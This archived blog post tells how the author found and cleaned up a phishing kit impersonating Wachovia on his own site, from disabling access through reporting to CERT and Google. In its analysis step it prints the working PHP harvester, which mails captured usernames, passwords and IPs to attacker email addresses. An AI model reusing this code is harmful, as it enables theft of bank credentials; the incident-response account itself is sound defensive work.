<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
<head profile="http://gmpg.org/xfn/11">
	<title>If your site has been compromised with phishing attack code&#8230; | Chronosynclastic Infundibulum</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
	<link rel="stylesheet" type="text/css" href="../../../../wp-content/themes/the-erudite/css/erudite.css" />
	<!--[if lte IE 6]> <link rel="stylesheet" href="http://www.semanticoverload.com/wp-content/themes/the-erudite/css/ie6.css" type="text/css"> 
	<style type="text/css" media="screen">
		.hr {behavior: url(http://www.semanticoverload.com/wp-content/themes/the-erudite/library/iepngfix.htc); }
	</style> <![endif]-->
	<!--[if lte IE 7 ]> <link rel="stylesheet" href="http://www.semanticoverload.com/wp-content/themes/the-erudite/css/ie7.css" type="text/css"> <![endif]-->
	<!--[if gte IE 8 ]> <link rel="stylesheet" href="http://www.semanticoverload.com/wp-content/themes/the-erudite/css/ie8.css" type="text/css"> <![endif]-->
	<script type="text/javascript">
// <![CDATA[
		var erdt = {
			More: '<span>↓</span> Keep Reading',
			Less: '<span>↑</span> Put Away',
			Info: '&#x2193; Further Information',
			MenuShow: '<span>↓</span> Show Menu',
			MenuHide: '<span>↑</span> Hide Menu',
			DisableKeepReading: false,
			DisableHide: false 
		};
		(function(H){H.className=H.className.replace(/\bno-js\b/,'js')})(document.documentElement)
// ]]>
	</script>
	<link rel="pingback" href="../../../../xmlrpc.php" />
<link rel="alternate" type="application/rss+xml" title="Chronosynclastic Infundibulum &raquo; Feed" href="../../../../feed/index.html" />
<link rel="alternate" type="application/rss+xml" title="Chronosynclastic Infundibulum &raquo; Comments Feed" href="../../../../comments/feed/index.html" />
<!-- Google Analytics tracking code not shown because users over level 0 are ignored -->
<link rel="alternate" type="application/rss+xml" title="Chronosynclastic Infundibulum &raquo; If your site has been compromised with phishing attack code&#8230; Comments Feed" href="feed/index.html" />
<script type='text/javascript' src='http://www.semanticoverload.com/wp-includes/js/jquery/jquery.js?ver=1.8.3'></script>
<script type='text/javascript' src='http://www.semanticoverload.com/wp-includes/js/comment-reply.min.js?ver=3.5'></script>
<script type='text/javascript' src='http://www.semanticoverload.com/wp-includes/js/swfobject.js?ver=2.2-20120417'></script>
<link rel='prev' title='Hoysala construction techniques in Halebidu' href='../../../../2008/12/18/hoysala-construction-techniques/index.html' />
<link rel='next' title='On the Institution of Marriage' href='../../../11/13/on-the-institution-of-marriage/index.html' />
<meta name="generator" content="WordPress 3.5, fitted with the WordPress Mobile Pack 1.2.4" />

<!-- All in One SEO Pack 1.6.13.2 by Michael Torbert of Semper Fi Web Design[236,347] -->
<meta name="description" content="I recently recevied the following email: To whom it may concern: Please be aware that Wachovia Corporation (“Wachovia”) is the owner of numerous United" />
<meta name="keywords" content="internet,legal,technology,web" />
<link rel="canonical" href="index.html" />
<!-- /all in one seo pack -->
</head>
<body class="single single-post postid-316 single-format-standard hiding">

<div id="wrapper" class="hfeed">
	
	<div id="header-wrap">
		<div id="header" role="banner">
			<h1 id="blog-title"><span><a href="../../../../index.html" title="Chronosynclastic Infundibulum" rel="home">Chronosynclastic Infundibulum</a></span></h1>
			<div id="blog-description">The world through my prisms</div>
		</div><!--  #header -->

		<div id="access" role="navigation">
			<div class="skip-link"><a href="index.html%3Fwpmp_switcher=mobile.html#content" title="Skip to content">Skip to content</a></div>
			<div id="menu"><ul><li class="page_item page-item-383"><a href="../../../../archive/index.html">Archive</a></li><li class="page_item page-item-581"><a href="../../../../colophon/index.html">Colophon</a></li></ul></div>
		</div><!-- #access -->

	</div><!--  #header-wrap -->
	<div id="container">
		<div id="content" role="main">

						<div id="post-316" class="post-316 post type-post status-publish format-standard hentry category-internet category-legal category-technology category-web tag-attack tag-internet tag-phishing tag-php tag-scam tag-security tag-technology tag-tutorial tag-wachovia tag-web">
				<h2 class="entry-title">If your site has been compromised with phishing attack code&#8230;</h2>
				<div class="entry-content">
<p>I recently recevied the following email:</p>
<blockquote><p>To whom it may concern:</p>
<p>Please be aware that Wachovia Corporation (“Wachovia”) is the owner of numerous United States and foreign trade marks and services marks used in connection with its financial services and products (the &#8220;Wachovia Marks&#8221;), including the Wachovia wordmark and Wachovia logo.  Wachovia has expended substantial resources to advertise and promote its products and services under the marks and considers the marks to be valuable assets of Wachovia.</p>
<p>It has come to our attention that your company is hosting a known active phishing site.  The active phishing site displays the Wachovia Marks and is intended to defraud customers in an attempt to capture and use their identity.  Network Whois records indicate the IP address of the phishing site is registered to your Internet space.</p>
<p>Accordingly, we request that your site bring down the Phishing web site at:<br />
&lt;&lt; http://&lt;my website&gt;/home/plugins/editors-xtd/confirm.html &gt;&gt;</p></blockquote>
<p>So that&#8217;s how I knew that my site had been compromised by hackers and a <a href="http://en.wikipedia.org/wiki/Phishing">phishing attack</a> code had been injected into my site. <strong>If it has happened to you, do you know what is the right thing to do? How do you fix it? </strong>Well, here is what I did, and I think it is worthwhile to share this information so that it may be useful to others.. So here goes.<br />
<span id="more-316"></span></p>
<h3>Step 1. Disable Your Site</h3>
<p>First, disable your site, bring it down temporarily. The last thing you want is for more people to be scammed by a hacker who compromised your site. You can do that by disabling all access to all the files within your website. If the website is running on unix/linux you can do a &#8220;chmod -R 000 &lt;website-home-directory&gt;&#8221; (Refer to the <a title="Chmod tutorial" href="http://www.zzee.com/solutions/chmod-help.shtml">chmod tutorial here</a>). For those using cpanel, go to the file manager and change the permissions of the document root for the website.</p>
<h3>Step 2. Investigate the Offending Webpage</h3>
<p>Now that no more unsuspecting users can be affected by this phishing attack. Now we dig into the offending webpage that is causing the problem. In my case it was: http://&lt;my website&gt;/home/plugins/editors-xtd/confirm.html</p>
<p>I opened up the html file, and this is what I saw:</p>
<blockquote><p>&#8230;&#8230;</p>
<p>&lt;html xmlns=&#8221;http://www.w3.org/1999/xhtml&#8221;&gt;&lt;head&gt;</p>
<p>&lt;title&gt;Wachovia &#8211; Personal Finance and Business Financial Services&lt;/title&gt;</p>
<p>&#8230;&#8230;</p></blockquote>
<p>Clearly, someone was impersonating the Wachovia website. Now, with phishing, someone is trying to steal your username and password by impersonating some crediable website that needs your username and password to get into. In HTML, this is typically accomplished through &#8216;forms&#8217;, which starts with a `&lt;form&gt;&#8217; tag in HTML. So I dug through the code and I saw two form tags.</p>
<p>The first one was:</p>
<blockquote><p>&lt;form method=&#8221;get&#8221; action=&#8221;http://search.wachovia.com/selfservice/microsites/wachoviaSearchEntry.do?&#8221; name=&#8221;searchForm&#8221; onsubmit=&#8221;return verifyQuery(this.searchString);&#8221;&gt;</p></blockquote>
<p>&#8230;..</p>
<p>This looks fine because the &#8216;action&#8217; parameter points to http://search.wachovia.com/selfservice&#8230;. which is a search script on the Wachovia website. So anyone filling you this form is sendin their data to the Wachovia website and the hacker will not get any information from it.</p>
<p>Now to the second form tag:</p>
<blockquote><p>&lt;form method=&#8221;post&#8221; action=&#8221;screen.php&#8221; name=&#8221;uidAuthForm&#8221; id=&#8221;uidAuthForm&#8221; onsubmit=&#8221;return submitLogin(this)&#8221;&gt;</p>
<p>&#8230;&#8230;</p></blockquote>
<p>Aha! The smoking gun! Why? Well, look at the &#8216;action&#8217; parameter in this &#8216;form&#8217; tag, it says &#8216;screen.php&#8217; which is clearly not a script that is on the Wachovia servers, but something that is hosted on my website! So the hackers installed another script on my system to phish the username and passwords. Now I go see what&#8217;s inside this &#8216;screen.php&#8217; file that is located in the same directory as the &#8216;confirm.html&#8217; file we have been looking at so far.</p>
<h3>Step 3. Isolate the script that is doing the actual phishing attack and find the offenders</h3>
<p>So I open up the &#8216;screen.php&#8217; file and this is what I find:</p>
<blockquote><p>&lt;?php</p>
<p>$ip = getenv(&#8220;REMOTE_ADDR&#8221;);<br />
$datamasii=date(&#8220;D M d, Y g:i a&#8221;);<br />
$userid = $HTTP_POST_VARS["userid"];<br />
$password = $HTTP_POST_VARS["password"];<br />
$mesaj = &#8220;Hello<br />
userid : $userid<br />
password : $password<br />
&#8212;&#8212;&#8211;0WN3d By Louis&#8212;&#8212;&#8212;&#8212;&#8212;-<br />
IP : $ip<br />
DATE : $datamasii<br />
&#8220;;</p>
<p>$recipient = &#8220;cashbug5010@gmail.com,smithgreen@hotmail.com&#8221;;<br />
$subject = &#8220;Take What U need But Make Sure U Cash It Out !!!&#8221;;</p>
<p>mail($recipient,$subject,$mesaj);<br />
mail($to,$subject,$mesaj);<br />
header(&#8220;Location: http://www.wachovia.com/helpcenter/0,,,00.html&#8221;);<br />
?&gt;</p></blockquote>
<p>So here we are! Gotcha! Check out the line &#8216;$recipient = &#8220;cashbug5010@gmail.com,smithgreen@hotmail.com&#8221;;&#8217; Clearly, the phishing attack was being carried out by the following two email addresses: cashbug5010@gmail.com and smithgreen@hotmail.com. Now that I have this much information, what do we do next?</p>
<h3>Step 4. Inform the Authorities</h3>
<p>We give this information to the authorities who can carry the investigation forward. And who are they? First, respond back to the email address that alerted you of this phishing attack (do a &#8216;reply all&#8217; if there were multiple recipients/Cc&#8217;s to the email you received). Also, copy phishing-report@us-cert.gov and cert@cert.org to this email and just give them a copy of the phishing code (in this case it was the file &#8216;screen.php&#8217;) and the offending email addresses you found.</p>
<p>As for now, that is all you can do, and just co-operate with the authorities if they need more information.</p>
<h3>Step 5. Quarantine the Malicious Code and Restore Your Website</h3>
<p>Quarantine the files (by disabling their permission to &#8217;000&#8242;) and now that the code has been quarantined, you can bring your website up again by setting the permission back to as they were earlier (except for the offending code).</p>
<p><strong>DO NOT DELETE THE MALICIOUS CODE BECAUSE IT IS EVIDENCE AGAINST THE PHISHING ATTACK AND EXONERATES YOU! </strong>Otherwise, the authorities may pursue you as an accessory to the crime!</p>
<h3>Step 6. Inform Google That Your Site is Safe Again</h3>
<p>Now, note that the odds are that Google has already put a notice out against your site as a source of a phishing attack. So go to the following URL <a href="http://www.google.com/safebrowsing/report_error/">http://www.google.com/safebrowsing/report_error/</a> to let Google know that the problem has been taken care off and you site is safe again.</p>
<p>And that&#8217;s all you can do for the moment. Make sure your site is secure and you haven&#8217;t given permission to any of your directories to be writable by anyone except you. As for preventing future security breaches, it is always a cat-and-mouse game with hackers and like of you getting smarter and better than the other.</p>

				</div>
				<div class="entry-meta">
					<span class="entry-date"><abbr class="published" title="2009-03-17T02:30:42+0000">March 17, 2009 &#8211; 2:30 am</abbr></span>
					<span class="meta-sep">|</span>
					<span class="author vcard">By <a href="../../../../author/admin/index.html" title="Posts by Semantic Overload">Semantic Overload</a></span>
					<span class="meta-sep">|</span>
					<span class="cat-links">Posted in <a href="../../../../category/internet/index.html" title="View all posts in internet" rel="category tag">internet</a>, <a href="../../../../category/legal/index.html" title="View all posts in legal" rel="category tag">legal</a>, <a href="../../../../category/technology/index.html" title="View all posts in technology" rel="category tag">technology</a>, <a href="../../../../category/web/index.html" title="View all posts in web" rel="category tag">web</a></span>
					<span class="meta-sep">|</span>
					<span class="tag-links">Tagged <a href="../../../../tag/attack/index.html" rel="tag">attack</a>, <a href="../../../../tag/internet/index.html" rel="tag">internet</a>, <a href="../../../../tag/phishing/index.html" rel="tag">phishing</a>, <a href="../../../../tag/php/index.html" rel="tag">php</a>, <a href="../../../../tag/scam/index.html" rel="tag">scam</a>, <a href="../../../../tag/security/index.html" rel="tag">security</a>, <a href="../../../../tag/technology/index.html" rel="tag">technology</a>, <a href="../../../../tag/tutorial/index.html" rel="tag">tutorial</a>, <a href="../../../../tag/wachovia/index.html" rel="tag">wachovia</a>, <a href="../../../../tag/web/index.html" rel="tag">web</a></span>
					<span class="meta-sep">|</span>
					<span class="comments-link"><a href="index.html#comments" title="Comment on If your site has been compromised with phishing attack code&#8230;">Comments (7)</a></span>
				</div>
			</div><!-- .post -->

			<div id="nav-below" class="navigation">
				<div class="nav-previous"><a href="../../../../2008/12/18/hoysala-construction-techniques/index.html" rel="prev"><span class="meta-nav">&larr;</span> Hoysala construction techniques in Halebidu</a></div>
				<div class="nav-next"><a href="../../../11/13/on-the-institution-of-marriage/index.html" rel="next">On the Institution of Marriage <span class="meta-nav">&rarr;</span></a></div>
			</div>

			<div id="comments">
<p class="disabled">Comments are disabled for this post</p></div><!-- .comments -->
		</div><!-- #content -->
	</div><!-- #container -->


	<div id="footer-wrap">
		<div id="footer-wrap-inner">
			<div id="primary" class="footer">
				<ul class="xoxo">
		<li><h2>Copyright</h2>			<div class="textwidget"><a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/3.0/"><img alt="Creative Commons License" style="border-width:0" src="http://i.creativecommons.org/l/by-nc-nd/3.0/88x31.png" /></a><br />This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/3.0/">Creative Commons Attribution-NonCommercial-NoDerivs 3.0 Unported License</a>.</div>
		</li>				</ul>
			</div><!-- #primary .sidebar -->

		<div id="secondary" class="footer">
			<ul class="xoxo">
	
			<li id="text-3" class="widget widget_text">
				<h3 class="widgettitle">Proud member</h3>
			<div class="textwidget"><a href="http://www.hcoop.net" target="_blank" style="border:none;"><img src="http://anil.net.in/images/drwg/hcoop/hcooprh.png" height=100/></a></div>
		
			</li>
			</ul>
		</div><!-- #secondary .sidebar -->

		<div id="ternary" class="footer">
			<ul class="xoxo">
	
			<li id="text-6" class="widget widget_text">
				<h3 class="widgettitle">This site is now defunct</h3>
			<div class="textwidget">I have discontinued blogging. This site is a static html dump and will not be updated. Ever.</div>
		
			</li>
			</ul>
		</div><!-- #ternary .sidebar -->
			<div id="footer">
				<span id="generator-link"><a href="http://wordpress.org/" title="WordPress" rel="generator">WordPress</a></span>
				<span class="meta-sep">|</span>
				<span id="theme-link"><a href="http://somadesign.ca/" title="The Erudite theme for WordPress" rel="designer nofollow">The Erudite</a></span>
			</div><!-- #footer -->
		</div><!-- #footer-wrap-inner -->
	</div><!-- #footer-wrap -->

</div><!-- #wrapper .hfeed -->
<p><a onclick='document.cookie="wpmp_switcher=mobile;path=/;expires=Tue, 01-01-2030 00:00:00 GMT";' href='index.html%3Fwpmp_switcher=mobile.html'>Switch to our mobile site</a></p><script type='text/javascript' src='../../../../wp-content/themes/the-erudite/js/jquery.scrollTo-min.js%3Fver=1.4.2'></script>
<script type='text/javascript' src='../../../../wp-content/themes/the-erudite/js/common.js%3Fver=2.7.7'></script>
<!--stats_footer_test--><script src="http://stats.wordpress.com/e-201303.js" type="text/javascript"></script>
<script type="text/javascript">
st_go({blog:'3587340',v:'ext',post:'316'});
var load_cmc = function(){linktracker_init(3587340,316,2);};
if ( typeof addLoadEvent != 'undefined' ) addLoadEvent(load_cmc);
else load_cmc();
</script>
</body>
</html>